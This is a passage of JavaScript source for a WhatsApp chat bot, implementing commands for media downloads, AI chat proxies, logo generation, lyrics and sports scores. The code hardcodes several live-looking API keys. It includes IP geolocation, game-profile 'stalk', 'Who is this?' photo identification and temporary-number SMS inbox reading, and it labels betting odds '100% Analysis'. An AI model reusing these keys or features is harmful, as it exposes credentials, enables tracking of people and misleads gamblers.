    } catch (error) {
        console.error('Error generating Logo:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.`);
    }
    break;
}
case 'dragonball': {
    if (!text) return replyphistar(`Example: ${prefix + command} BIG DADDY`);

    try {
        // Construct API URL
        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/create-dragon-ball-style-text-effects-online-809.html`;

        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;

        if (status && BK9) {
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: BK9 },
                caption: `\n> Dragon Ball Logo Generated Successfully!`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate the Dragon Ball logo. Please try again.`);
        }
    } catch (error) {
        console.error('Error generating Dragon Ball logo:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.`);
    }
    break;
}

case 'listcurrency': {
    axios.get('https://api.exchangerate-api.com/v4/latest/USD')
        .then(response => {
            const currencies = Object.keys(response.data.rates);
            const currencyList = currencies.join(', ');
            replyphistar(`Supported Currencies: ${currencyList}`);
        })
        .catch(() => replyphistar('❌ Could not retrieve the list of currencies. Please try again later.'));
    break;
}

case 'tinyurl': {
    if (!q) return replyphistar('❌ Provide a valid link to shorten.');

    const request = require('request');
    request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, response, body) {
        try {
            replyphistar(body);
        } catch (e) {
            replyphistar(`❌ Error: ${e}`);
        }
    });
    break;
}
case 'predictions': 
case 'sureodd': 
case 'sureodds': {
    // List of multiple API keys
    const apiKeys = [
        '73338da37ce534482c87846eab310b6f',
        '0e633fb2254604579825c34f3639dce3',
        '4819be8d34033fc925862bf47d3a80c8'
    ];

    // Randomly pick an API key
    const randomApiKey = apiKeys[Math.floor(Math.random() * apiKeys.length)];

    // API URL with the randomly chosen key
    const apiUrl = `https://api.the-odds-api.com/v4/sports/soccer_epl/odds?apiKey=${randomApiKey}&regions=us`;

    try {
        await replyphistar('🔍 Fetching real sure odds...');

        const response = await axios.get(apiUrl);
        const matches = response.data.slice(0, 3); // Get top 3 sure odds

        if (!matches.length) {
            return replyphistar('❌ No sure odds available at the moment. Try again later.');
        }

        let message = "🔥 *Sure Odds (100% Analysis)* 🔥\n\n";
        matches.forEach(match => {
            message += `⚽ *Match:* ${match.home_team} vs ${match.away_team}\n`;
            message += `📊 *Odds:* ${match.bookmakers[0].markets[0].outcomes[0].price}\n`;
            message += `💰 *Best Bookmaker:* ${match.bookmakers[0].title}\n\n`;
        });

        replyphistar(message.trim());
    } catch (error) {
        console.error(error);
        replyphistar('❌ Failed to fetch real sure odds. Try again later.');
    }
    break;
}
case 'sports': {
    const menu = `*⚽ Sports Menu:*\n
1️⃣ .livescores - Get live scores of ongoing matches.
2️⃣ .fixtures <league> - View upcoming matches for a specific league.
3️⃣ .standings <league> - Check the league standings.
4️⃣ .sportsnews - Get the latest sports news.\n
Use these commands to stay updated with sports events!`;
    
    replyphistar(menu);
    break;
}

case 'livescores': {
    if (!isCreator) return replyphistar(mess.owner); // Fix: Proper condition placement

    try {
        const apiUrl = 'https://livescore6.p.rapidapi.com/matches/v2/list-live?Category=soccer';
        const apiKey = 'a5bf8cd433msh33c0811108517b2p1b77a6jsn4cd75f147bf8'; // Your API Key

        const response = await fetch(apiUrl, {
            method: 'GET',
            headers: {
                'X-RapidAPI-Key': apiKey,
                'X-RapidAPI-Host': 'livescore6.p.rapidapi.com',
            },
        });

        if (!response.ok) {
            return replyphistar("❌ Failed to fetch live scores. Please try again later.");
        }

        const data = await response.json();

        if (!data || !data.Stages || data.Stages.length === 0) {
            return replyphistar("❌ No live matches currently.");
        }

        let liveScores = "*⚽ Live Soccer Scores:*\n\n";
        data.Stages.forEach((stage) => {
            stage.Events.forEach((event) => {
                const home = event.T1?.[0]?.Nm || "Team 1";
                const away = event.T2?.[0]?.Nm || "Team 2";
                const score = `${event.Tr1 ?? 0} - ${event.Tr2 ?? 0}`; // Fix: Using nullish coalescing for safety
                liveScores += `🏟️ ${home} vs ${away}\n📊 *Score:* ${score}\n\n`;
            });
        });

        await PhistarBotInc.sendMessage(m.chat, {
            image: { url: 'https://files.catbox.moe/xm02jo.jpg' },
            caption: liveScores.trim(),
        }, { quoted: m });

    } catch (error) {
        console.error("Error fetching live scores:", error);
        replyphistar("❌ An error occurred while fetching live scores. Please try again later.");
    }
    break;
}
case 'ffstalk': {
    if (!args[0]) return replyphistar('❌ Please provide a Free Fire ID. Example: .ffstalk 8533270051');

    const ffId = args[0];
    const apiUrl = `https://api.davidcyriltech.my.id/ffstalk?id=${ffId}`;

    try {
        const response = await axios.get(apiUrl);
        const data = response.data;

        if (!data.success) return replyphistar('❌ Failed to fetch data. Please check the ID and try again.');

        // Extract account details
        const {
            name, level, xp, region, likes, created_at, last_login, honor_score, 
            booyah_pass, BR_points, CS_points
        } = data.account;

        const guild = data.guild ? `\n🏴 Guild: ${data.guild.name} (Level: ${data.guild.level})` : '';

        const message = `
🎮 *Free Fire Profile* 🎮
━━━━━━━━━━━━━━━━━
👤 *Name:* ${name}
🆔 *ID:* ${ffId}
⭐ *Level:* ${level} (XP: ${xp})
🌍 *Region:* ${region}
👍 *Likes:* ${likes}
📅 *Created:* ${created_at}
⏳ *Last Login:* ${last_login}
🛡 *Honor Score:* ${honor_score}
🔥 *Booyah Pass:* ${booyah_pass}
🏆 *Battle Royale Points:* ${BR_points}
⚔️ *Clash Squad Points:* ${CS_points}
${guild}
━━━━━━━━━━━━━━━━━
    `;

        replyphistar(message);
    } catch (error) {
        console.error('FF Stalk Error:', error);
        replyphistar('❌ An error occurred while fetching data. Please try again later.');
    }
    break;
}
case 'trackip': {
    if (!text) return replyphistar(`*Example:* ${prefix + command} 112.90.150.204`);

    try {
        let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());

        const formatIPInfo = (info) => {
            return `
*IP Information*
• IP: ${info.ip || 'N/A'}
• Success: ${info.success || 'N/A'}
• Type: ${info.type || 'N/A'}
• Continent: ${info.continent || 'N/A'}
• Continent Code: ${info.continent_code || 'N/A'}
• Country: ${info.country || 'N/A'}
• Country Code: ${info.country_code || 'N/A'}
• Region: ${info.region || 'N/A'}
• Region Code: ${info.region_code || 'N/A'}
• City: ${info.city || 'N/A'}
• Latitude: ${info.latitude || 'N/A'}
• Longitude: ${info.longitude || 'N/A'}
• Is EU: ${info.is_eu ? 'Yes' : 'No'}
• Postal: ${info.postal || 'N/A'}
• Calling Code: ${info.calling_code || 'N/A'}
• Capital: ${info.capital || 'N/A'}
• Borders: ${info.borders || 'N/A'}
• Flag:
  - Image: ${info.flag?.img || 'N/A'}
  - Emoji: ${info.flag?.emoji || 'N/A'}
  - Emoji Unicode: ${info.flag?.emoji_unicode || 'N/A'}
• Connection:
  - ASN: ${info.connection?.asn || 'N/A'}
  - Organization: ${info.connection?.org || 'N/A'}
  - ISP: ${info.connection?.isp || 'N/A'}
  - Domain: ${info.connection?.domain || 'N/A'}
• Timezone:
  - ID: ${info.timezone?.id || 'N/A'}
  - Abbreviation: ${info.timezone?.abbr || 'N/A'}
  - Is DST: ${info.timezone?.is_dst ? 'Yes' : 'No'}
  - Offset: ${info.timezone?.offset || 'N/A'}
  - UTC: ${info.timezone?.utc || 'N/A'}
  - Current Time: ${info.timezone?.current_time || 'N/A'}
`;
        };

        if (!res.success) throw new Error(`IP ${text} not found!`);

        await PhistarBotInc.sendMessage(m.chat, { location: { degreesLatitude: res.latitude, degreesLongitude: res.longitude } }, { ephemeralExpiration: 604800 });
        const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
        await delay(2000);
        replyphistar(formatIPInfo(res));
    } catch (e) {
        replyphistar(`Error: Unable to retrieve data for IP ${text}`);
    }
    break;
}
case 'get': {
    if (typeof text !== 'string' || !text.trim()) {
        return replyphistar(`Add Input (Link)\n\nExample: ${prefix + command} https://example.com`);
    }

    const isUrl = (url) => {
        return url.match(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/gi);
    };

    const urlMatch = isUrl(text);
    if (!urlMatch) {
        return replyphistar(`Invalid URL provided. Please provide a valid URL.\n\nExample: ${prefix + command} https://example.com`);
    }

    const url = urlMatch[0]; // Use the first match
    try {
        const res = await axios.get(url);
        if (!/json|html|plain/.test(res.headers['content-type'])) {
            return replyphistar(`The content type of the provided URL is not supported.\n\nSupported types: json, html, plain text.`);
        }

        replyphistar(util.format(res.data));
    } catch (e) {
        replyphistar(`Error fetching data from the provided URL: ${util.format(e.message)}`);
    }
}
break;
case 'llama': {
    if (!text) {
        replyphistar('Please Ask Llama AI Anything.');
        return;
    }

    try {
        const response = await axios.get('https://bk9.fun/ai/llama', {
            params: { q: text }
        });

        if (response.data.status) {
            const replyMessage = response.data.BK9;
            replyphistar(replyMessage);
        } else {
            replyphistar('Failed to get a response from Llama AI.');
        }
    } catch (error) {
        console.error('Error fetching from Llama API:', error);
        replyphistar('An error occurred while connecting to Llama AI. Please try again later.');
    }
    break;
}
case 'big-Daddy-ai': {
    if (!text) {
        replyphistar('Hello! How can I assist you today.');
        return;
    }

    try {
        const response = await axios.get('https://bk9.fun/ai/jeeves-chat2', {
            params: { q: text }
        });

        if (response.data.status) {
            const replyMessage = response.data.BK9;
            replyphistar(replyMessage);
        } else {
            replyphistar('Failed to get a response from Big Daddy AI.');
        }
    } catch (error) {
        console.error('Error fetching from Big Daddy ai:', error);
        replyphistar('An error occurred while connecting to Big Daddy Server. Please try again later.');
    }
    break;
}
case 'ngl': {
    if (!text || !text.includes('|')) {
        return replyphistar(`*Usage:* .ngl <username>|<message>\n\n*Example:* .ngl phista1|Hey bro!`);
    }

    try {
        // Parse the username and message
        const [username, message] = text.split('|').map(t => t.trim());

        if (!username || !message) {
            return replyphistar(`*Usage:* .ngl <username>|<message>\n\n*Example:* .ngl davidcyril11|Hello there!`);
        }

        // Construct the NGL link using the username
        const nglLink = `https://ngl.link/${username}`;

        // Call the NGL API
        const apiResponse = await axios.get(`https://api.siputzx.my.id/api/tools/ngl`, {
            params: { link: nglLink, text: message }
        });

        // Check API response
        if (apiResponse.status === 200 && apiResponse.data.status) {
            replyphistar(`✅ *Message Sent Successfully!*\n\n📩 Message: "${message}"\n🔗 NGL Username: ${username}`);
        } else {
            replyphistar(`❌ *Failed to send the message.* Please try again.`);
        }
    } catch (error) {
        console.error('Error in NGL command:', error);
        replyphistar(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }
    break;
}
case 'tiktok':
case 'tt':
case 'tiktokdl': {
    if (!text) return replyphistar(`*Example*: ${prefix + command} <URL or Link>`);

    try {
        // Fetch video and audio data from the TikTok API
        const response = await axios.get(`https://api.paxsenix.biz.id/dl/tiktok?url=${encodeURIComponent(text)}`);
        const data = response.data;

        if (data && data.downloadsUrl) {
            const { video, music } = data.downloadsUrl;

            // Send the video
            await PhistarBotInc.sendMessage(m.chat, {
                video: { url: video },
                mimetype: 'video/mp4',
                caption: `🎥 *TikTok Video Downloaded Successfully*`
            }, { quoted: m });

            // Send the audio separately
            if (music) {
                await PhistarBotInc.sendMessage(m.chat, {
                    audio: { url: music },
                    mimetype: 'audio/mp4',
                    fileName: `tiktok_audio.mp3`,
                    caption: `🎵 *Here is the TikTok sound*`
                }, { quoted: m });
            }
        } else {
            replyphistar(`❌ *Failed to fetch the TikTok video. Please check the URL and try again.*`);
        }
    } catch (error) {
        console.error("Error in TikTok Downloader:", error);
        replyphistar(`❌ *An error occurred while downloading the TikTok video. Please try again later.*`);
    }
    break;
}
case 'facebook': case 'fb': case 'fbdl': case 'fbdownload': {
    if (!text) {
        return reply(`*Please provide a Facebook URL or video link.*`);
    }

    try {
        // Notify the user the bot is processing the request
        await PhistarBotInc.sendMessage(m.chat, { text: `⏳ *Processing your request...*` });

        // Fetch video data from the API
        const apiResponse = await axios.get(`https://api.siputzx.my.id/api/d/facebook`, {
            params: { url: text }
        });

        const { status, data } = apiResponse.data;

        if (status && data && data.video) {
            const videoLink = data.video;
            const videoTitle = data.userInfo?.name || "Facebook Video";
            const thumbnail = data.thumbnail;

            // Send the video as a normal video
            await PhistarBotInc.sendMessage(m.chat, {
                video: { url: videoLink },
                mimetype: 'video/mp4',
                caption: `🎥 *Video Title:* ${videoTitle}\n\nEnjoy your video! 🎬`
            }, { quoted: m });
        } else {
            reply(`*❌ Failed to download the video. Please check the link and try again.*`);
        }
    } catch (error) {
        console.error("Error in Facebook Downloader:", error);
        reply(`*An error occurred while processing your request. Please try again later.*`);
    }
    break;
}  
case 'instagram': 
case 'ig': 
case 'igvideo': 
case 'igimage': 
case 'igvid': 
case 'igimg': 
case 'igdownload': 
case 'instadl': 
case 'instagramdl': 
case 'igdl': {
    if (!text || !text.startsWith('http')) {
        return replyphistar(`*Usage:* .igdl <Instagram URL>\n\n*Example:* .igdl https://www.instagram.com/p/CyIqjWusPec/`);
    }

    try {
        // Call the Instagram downloader API
        const apiResponse = await axios.get(`https://bk9.fun/download/instagram2`, {
            params: { url: text },
        });

        // Check API response
        if (apiResponse.status === 200 && apiResponse.data.status) {
            const mediaList = apiResponse.data.BK9;

            if (mediaList.length === 0) {
                return replyphistar(`No media found at the provided Instagram URL.`);
            }

            // Send each media item
            for (const media of mediaList) {
                await PhistarBotInc.sendMessage(
                    m.chat,
                    {
                        video: { url: media.url }, // Send as a video
                        caption: `*Instagram Downloader*\n\n🔗 URL: ${text}`,
                    },
                    { quoted: m }
                );
            }
        } else {
            replyphistar(`*Failed to fetch media from the provided URL.*`);
        }
    } catch (error) {
        console.error('Error in Instagram Downloader command:', error);
        replyphistar(`*An error occurred while processing your request:*\n\n${error.message}`);
    }
    break;
}
case 'twitter': {
    if (!text) return replyphistar(`*Example*: ${prefix + command} https://twitter.com/example/status/1234567890`);

    try {
        replyphistar('🔍 Fetching Twitter media, please wait...');

        // Fetch media download details from API
        const twitterApiUrl = `https://apis.davidcyriltech.my.id/download/twitter?url=${encodeURIComponent(text)}`;
        const twitterResponse = await axios.get(twitterApiUrl);

        if (twitterResponse.data.success) {
            const { HD, SD, audio, thumb } = twitterResponse.data.result;

            // Determine best available video quality
            const videoUrl = HD || SD;

            if (!videoUrl) return replyphistar("❌ No video found for this Twitter link.");

            // Send Video
            await PhistarBotInc.sendMessage(m.chat, {
                video: { url: videoUrl },
                mimetype: 'video/mp4',
                caption: `🎬 *Here is your Twitter video!*`
            }, { quoted: m });

            // Send Audio (if available)
            if (audio) {
                await PhistarBotInc.sendMessage(m.chat, {
                    audio: { url: audio },
                    mimetype: 'audio/mpeg',
                    fileName: `twitter_audio.mp3`,
                    caption: `🎵 *Here is the audio from the video!*`
                }, { quoted: m });
            }
        } else {
            replyphistar(`❌ Error fetching Twitter media. Please check the link and try again.`);
        }
    } catch (error) {
        console.error("Error in Twitter command:", error);
        replyphistar(`❌ An error occurred while processing your request. Please try again later.`);
    }
    break;
}
    case 'diary': {
    const diary = loadDiary();
    const userId = m.sender;
    if (!args[0]) {
        const userDiary = diary[userId] || [];
        if (userDiary.length === 0) return replyphistar("Your diary is empty. Add entries with `.diary <entry>`");
        const diaryContent = userDiary.map((entry, i) => `${i + 1}. ${entry}`).join('\n');
        replyphistar(`📓 *Your Diary:*\n\n${diaryContent}`);
    } else {
        const entry = text.trim();
        if (!diary[userId]) diary[userId] = [];
        diary[userId].push(entry);
        saveDiary(diary);
        replyphistar(`✅ *Added to your diary:* "${entry}"`);
    }
    break;
}
case 'generate': {
    if (!text) {
        return replyphistar(`*Usage:* /generate <prompt>\n\n*Example:* /generate cat`);
    }

    try {
        // Call the Flux API
        const apiUrl = `https://api.davidcyriltech.my.id/flux?prompt=${encodeURIComponent(text)}`;
        
        // Send the generated image as a response
        await PhistarBotInc.sendMessage(m.chat, {
            image: { url: apiUrl },
            caption: `🎨 *Big Daddy V1 Image Generator*\n\n📄 *Prompt:* ${text}`,
        }, { quoted: m });
    } catch (error) {
        console.error('Error in Flux command:', error);
        replyphistar(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }
    break;
}
    case 'text2image': case 'textimg': case 'dalle': case 'magicstudio': {
    if (!text) {
        replyphistar('Please provide a prompt.');
        return;
    }

    try {
        const response = await axios.get('https://bk9.fun/ai/magicstudio', {
            params: { prompt: text },
            responseType: 'arraybuffer' // Ensures we handle the image data properly
        });

        const imageBuffer = Buffer.from(response.data, 'binary');

        // Send the image to the user
        await PhistarBotInc.sendMessage(m.chat, { image: imageBuffer, caption: `✨ Generated Image ✨` });
    } catch (error) {
        console.error('Error fetching from MagicStudio API:', error);
        replyphistar('An error occurred while generating the image. Please try again later.');
    }
    break;
}
    case 'ip': {
    if (!text) return replyphistar(`*Please provide an IP address!*\n\n*Example:* ${prefix + command} 8.8.8.8`);

    try {
        const apiResponse = await fetch(`https://endpoint.web.id/tools/cekip?key=gojou&id=${text}`);
        const ipv = await apiResponse.json();

        if (ipv.status) {
            const shannz = ipv.result;
            const tesk = `*[ IP CHECKER ]*\n\n` +
                         `> *IP:* ${shannz.ip}\n` +
                         `> *City:* ${shannz.city}\n` +
                         `> *Country:* ${shannz.country}\n` +
                         `> *Location:* ${shannz.loc}\n` +
                         `> *ORG:* ${shannz.org}\n` +
                         `> *Postal Code:* ${shannz.postal}\n` +
                         `> *Time Zone:* ${shannz.timezone}\n` +
                         `> *More Details:* ${shannz.readme}`;
            replyphistar(tesk);
        } else {
            replyphistar(`*❌ Error or IP not found! Please check the input and try again.*`);
        }
    } catch (error) {
        console.error('Error in IP Checker command:', error);
        replyphistar(`*An error occurred while processing your request. Please try again later.*`);
    }
    break;
}
    case 'gemini2': {
    if (!text) {
        return replyphistar('❓ *Please provide a query for Gemini AI.*');
    }

    try {
        const response = await axios.get('https://bk9.fun/ai/gemini', {
            params: { q: text }
        });

        if (response.data.status) {
            const replyMessage = response.data.BK9;
            replyphistar(replyMessage);
        } else {
            replyphistar('❌ *Failed to get a response from Gemini AI.*');
        }
    } catch (error) {
        console.error('Error fetching from Gemini API:', error);
        replyphistar('❌ *An error occurred while connecting to Gemini AI. Please try again later.*');
    }
    break;
}
case 'gemini': {
    if (!text) {
        return replyphistar('❓ *Please provide a query for Gemini AI.*');
    }

    try {
        const response = await axios.get('https://bk9.fun/ai/acloudai', {
            params: { q: text }
        });

        if (response.data.status) {
            const replyMessage = response.data.BK9;
            replyphistar(replyMessage);
        } else {
            replyphistar('❌ *Failed to get a response from Gemini AI.*');
        }
    } catch (error) {
        console.error('Error fetching from Gemini API:', error);
        replyphistar('❌ *An error occurred while connecting to Gemini AI. Please try again later.*');
    }
    break;
}
case 'tempnumber': {
    replyphistar('🔍 Searching for available numbers randomly...');

    try {
        const countries = await getOnlineCountries(); // Fetch all online countries
        if (countries.length === 0) {
            replyphistar("❌ No online countries available at the moment.");
            break;
        }

        // Select a random country
        const randomCountry = countries[Math.floor(Math.random() * countries.length)];
        const numbers = await getCountryNumbers(randomCountry.name); // Fetch numbers for the random country

        if (numbers.length === 0) {
            replyphistar(`❌ No numbers available for ${randomCountry.name}.`);
            break;
        }

        // Select a random number from the country
        const randomNumber = numbers[Math.floor(Math.random() * numbers.length)];
        replyphistar(`📞 *Temporary Number Found:*\n\n🌍 *Country:* ${randomCountry.name}\n📱 *Number:* ${randomNumber.fullNumber}`);
    } catch (error) {
        console.error(error);
        replyphistar("❌ Failed to fetch temporary numbers. Please try again later.");
    }
    break;
}

case 'numberinbox': {
    const [country, number] = text.split('|');
    if (!country || !number) {
        return replyphistar("❓ Usage: .numberinbox <country>|<number>\nExample: .numberinbox Russia|123456789");
    }

    replyphistar(`📬 Checking inbox for number ${number} in ${country}...`);

    try {
        const inbox = await getNumberInbox(country.trim(), number.trim());
        if (!inbox || inbox.length === 0) {
            replyphistar(`📭 Inbox for ${number} in ${country} is empty or the number is offline.`);
        } else {
            const messages = inbox.map((msg, index) => `📩 *${index + 1}*. From: ${msg.sender}\n   Message: ${msg.text}`).join("\n\n");
            replyphistar(`📬 *Inbox for ${number}:*\n\n${messages}`);
        }
    } catch (error) {
        console.error(error);
        replyphistar("❌ Failed to fetch the inbox. Please check the number and try again.");
    }
    break;
}
case 'faceswap': {
    if (!quoted || !/image/.test(mime)) {
        return replyphistar(`*REQUEST ERROR!!*\n\n> Reply to an image with ${prefix}faceswap to initialize the process.`);
    }

    try {
        const mediaPath = await PhistarBotInc.downloadAndSaveMediaMessage(quoted);
        const uploadResponse = await catbox(mediaPath);

        if (!uploadResponse || !uploadResponse.url) {
            fs.unlinkSync(mediaPath);
            return replyphistar(`*UPLOAD ERROR!!*\n\n> Failed to upload the image.`);
        }

        const imageUrl = uploadResponse.url;

        if (!global.swapImage1) {
            global.swapImage1 = imageUrl;
            fs.unlinkSync(mediaPath);
            return replyphistar(`*FIRST IMAGE RECEIVED ✅*\n\n> Now reply with another image and use *${prefix}faceswap* again to swap faces.`);
        } else {
            const apiUrl = `https://api.siputzx.my.id/api/ai/faceswap?source=${global.swapImage1}&target=${imageUrl}`;
            global.swapImage1 = null;

            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: apiUrl },
                caption: `*FACE SWAP SUCCESSFUL! 🔥*`
            }, { quoted: m });

            fs.unlinkSync(mediaPath);
        }
    } catch (error) {
        console.error('FaceSwap Error:', error);
        replyphistar(`*PROCESSING ERROR!!*\n\n> ${error.message}`);
    }
    break;
}
case 'readmore': {
    const more = String.fromCharCode(8206);
    const readmore = more.repeat(4001);
    
    let [leftText, rightText] = text.split('|');
    if (!leftText) leftText = '';
    if (!rightText) rightText = '';
    
    const fullText = leftText + readmore + rightText;
    
    PhistarBotInc.sendMessage(m.chat, {
        text: fullText
    }, { quoted: m });
    break;
}
case 'onlinecountries': {
    replyphistar("🌍 Fetching available countries...");

    try {
        const countries = await getOnlineCountries(); // Fetch all online countries
        if (countries.length === 0) {
            replyphistar("❌ No online countries available at the moment.");
            break;
        }

        // Generate a professional list of countries
        const countryList = countries
            .map(c => `🌍 *Country:* ${c.name}\n   Code: ${c.code}`)
            .join("\n\n");
        replyphistar(`🌍 *Available Online Countries:*\n\n${countryList}`);
    } catch (error) {
        console.error(error);
        replyphistar("❌ Failed to fetch available countries. Please try again later.");
    }
    break;
}
case 'lyrics': {
    if (!text) return replyphistar(`*Example:* ${prefix + command} faded | Alan Walker`);

    try {
        // Extract song title and artist from input
        const [title, artist] = text.split('|').map(str => str.trim());
        if (!title || !artist) return replyphistar(`*Please provide both song title and artist, e.g.:* ${prefix + command} faded | Alan Walker`);

        // Notify user that the bot is fetching lyrics
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `🎶`, key: m.key } });
        await replyphistar(`Searching for lyrics...`);

        // Fetch lyrics from API
        const apiUrl = `https://api.davidcyriltech.my.id/lyrics?t=${encodeURIComponent(title)}&a=${encodeURIComponent(artist)}`;
        const response = await axios.get(apiUrl);

        if (response.data && response.data.lyrics) {
            const { title, artist, lyrics } = response.data;

            // Format the lyrics response
            const lyricsMessage = `🎵 *LYRICS FOUND*\n\n` +
                                  `*🎶 Song:* ${title}\n` +
                                  `*🎤 Artist:* ${artist}\n\n` +
                                  `${lyrics}\n`;

            // Send lyrics to the user
            replyphistar(lyricsMessage);
        } else {
            replyphistar(`*No lyrics found for:* ${title} by ${artist}`);
        }
    } catch (error) {
        console.error('Error fetching lyrics:', error);
        replyphistar(`*Failed to fetch lyrics. Possible reasons:*\n1. Invalid title or artist.\n2. API issues.\n\n*Error Details:* ${error.message}`);
    }
    break;
}
case 'hdimg': case 'remini': {
    // Check if the command is a reply to an image
    if (!/image/.test(mime)) {
        return replyphistar(`*REQUEST ERROR!! MESSAGE :*\n\n> *Reply to an image with .remini to enhance it*`);
    }

    if (!quoted) {
        return replyphistar(`*REQUEST ERROR!! MESSAGE :*\n\n> *Reply to an image with .remini to enhance it*`);
    }

    try {
        // Download the image locally
        const mediaPath = await PhistarBotInc.downloadAndSaveMediaMessage(quoted);

        // Upload the image to Catbox to get a public URL
        const uploadResponse = await catbox(mediaPath); // Using Catbox uploader

        if (!uploadResponse || !uploadResponse.url) {
            fs.unlinkSync(mediaPath); // Clean up the downloaded file
            return replyphistar(`*UPLOAD ERROR!! MESSAGE :*\n\n> Failed to upload the image to Catbox.`);
        }

        const imageUrl = uploadResponse.url; // Get the uploaded image URL

        // Use the Remini API with the uploaded image URL
        const enhancedImageUrl = `https://bk9.fun/tools/enhance?url=${imageUrl}`;

        // Send the enhanced image back to the user
        await PhistarBotInc.sendMessage(m.chat, {
            image: { url: enhancedImageUrl },
            caption: `*SUCCESSFULLY ENHANCED YOUR IMAGE 😍!!*\n\n`
        }, { quoted: m });

        // Clean up: Delete the downloaded file
        fs.unlinkSync(mediaPath);
    } catch (error) {
        console.error('Error in Remini command:', error);
        replyphistar(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }
    break;
}
case 'imgscan': {
    if (!/image/.test(mime)) {
        return replyphistar(`*❌ REQUEST ERROR!*\n\n> Please reply to an image with *${prefix}imgscan* to scan it.`);
    }

    if (!quoted) {
        return replyphistar(`*❌ REQUEST ERROR!*\n\n> Please reply to an image with *${prefix}imgscan* to scan it.`);
    }

    try {
        // Download the image locally
        const mediaPath = await PhistarBotInc.downloadAndSaveMediaMessage(quoted);

        // Upload the image (replace with your upload function)
        const uploadResponse = await uploadToImgur(mediaPath); // Ensure you have this function
        if (uploadResponse.status !== "success") {
            fs.unlinkSync(mediaPath); // Clean up the downloaded file
            return replyphistar(`*❌ UPLOAD ERROR!*\n\n> ${uploadResponse.message}`);
        }

        const imageUrl = uploadResponse.fileUrl;

        // Call the Gemini API for image analysis
        const apiResponse = await axios.get(`https://bk9.fun/ai/geminiimg`, {
            params: { url: imageUrl, q: "Who is this?" }
        });

        if (apiResponse.data.status) {
            const result = apiResponse.data.BK9;

            // Send the result to the user
            replyphistar(`*🔍 IMAGE SCAN RESULT:*\n\n${result}`);
        } else {
            replyphistar(`*❌ SCANNER ERROR!*\n\n> Unable to process the image. Please try again.`);
        }

        // Clean up: Delete the downloaded file
        fs.unlinkSync(mediaPath);

    } catch (error) {
        console.error('Error in imgscan command:', error);
        replyphistar(`*❌ AN ERROR OCCURRED!*\n\n> ${error.message}`);
    }
    break;
}
case 'imgsearch': case 'img': {
    if (!text) {
        return replyphistar(`*Usage:* .bingimg <query>\n\n*Example:* .img cat`);
    }

    try {
        // Call the Bing Image Search API
        const apiResponse = await axios.get(`https://api.siputzx.my.id/api/s/bimg`, {
            params: { query: text }
        });

        if (apiResponse.status === 200 && apiResponse.data.status) {
            const images = apiResponse.data.data;

            if (images.length === 0) {
                return replyphistar(`No images found for "${text}". Please try another query.`);
            }

            // Send up to 5 images
            const maxImages = Math.min(images.length, 5);
            for (let i = 0; i < maxImages; i++) {
                await PhistarBotInc.sendMessage(m.chat, {
                    image: { url: images[i] },
                    caption: `🔎 *Image Search Results*\n\n📄 *Query:* "${text}"\n📷 *Image ${i + 1}/${maxImages}*`,
                }, { quoted: m });
            }
        } else {
            replyphistar(`❌ *ERROR:* Failed to fetch images. Please try again.`);
        }
    } catch (error) {
        console.error('Error in Image Search command:', error);
        replyphistar(`❌ *AN ERROR OCCURRED:* ${error.message}`);
    }
    break;
}
    case 'shazam': {
    // Ensure the command is used on audio or video under 4MB
    if (!/audio|video/.test(mime)) {
        return replyphistar(`*Reply to an audio or video file with .shazam to identify the track.*`);
    }

    if (!quoted) {
        return replyphistar(`*Reply to an audio or video file with .shazam to identify the track.*`);
    }

    try {
        // Step 1: Download the media locally
        const mediaPath = await PhistarBotInc.downloadAndSaveMediaMessage(quoted);

        // Check file size (4MB max for the Shazam API)
        const stats = fs.statSync(mediaPath);
        if (stats.size > 4 * 1024 * 1024) { // 4MB limit
            fs.unlinkSync(mediaPath);
            return replyphistar(`*The file size exceeds 4MB, which is not supported by the Shazam API.*`);
        }

        // Step 2: Upload the media to Catbox to get a public URL
        const uploadResponse = await catbox(mediaPath);

        if (!uploadResponse || !uploadResponse.url) {
            fs.unlinkSync(mediaPath);
            return replyphistar(`*ERROR!! MESSAGE :*\n\n> Failed to upload the file.`);
        }

        const mediaUrl = uploadResponse.url;

        // Step 3: Call the PaxSenix Shazam API
        const apiUrl = `https://api.paxsenix.biz.id/tools/shazam?url=${encodeURIComponent(mediaUrl)}`;
        const apiResponse = await axios.get(apiUrl);

        if (!apiResponse.data || !apiResponse.data.ok || !apiResponse.data.track) {
            fs.unlinkSync(mediaPath);
            return replyphistar(`*Failed to identify the track. Please try again later.*`);
        }

        // Extract track information
        const track = apiResponse.data.track;
        const trackTitle = track.title || "Unknown Title";
        const trackArtist = track.artist || "Unknown Artist";
        const trackUrl = track.url || "No URL Available";
        const trackIsrc = track.isrc || "No ISRC Available";

        // Step 4: Send the result with the specified image
        const resultImage = 'https://files.catbox.moe/xdxmwk.jpg'; // Specified image
        await PhistarBotInc.sendMessage(m.chat, {
            image: { url: resultImage },
            caption: `🎵 *TRACK IDENTIFIED!!*\n\n` +
                     `*Title:* ${trackTitle}\n` +
                     `*Artist:* ${trackArtist}\n` +
                     `*ISRC:* ${trackIsrc}\n` +
                     `*More Info:* [Click Here](${trackUrl})`
        }, { quoted: m });

        // Clean up: Delete the downloaded file
        fs.unlinkSync(mediaPath);
    } catch (error) {
        console.error('Error in Shazam command:', error);
        replyphistar(`*AN ERROR OCCURRED!! MESSAGE*`);
    }
    break;
}
case 'url': {
    // Validate that the message is a reply to an image or video
    if (!quoted || !/video/.test(mime) && !/image/.test(mime)) {
        return replyphistar(`*REQUEST ERROR!! MESSAGE:*\n\n> *Reply/Send Image/Video With Caption .url*`);
    }

    try {
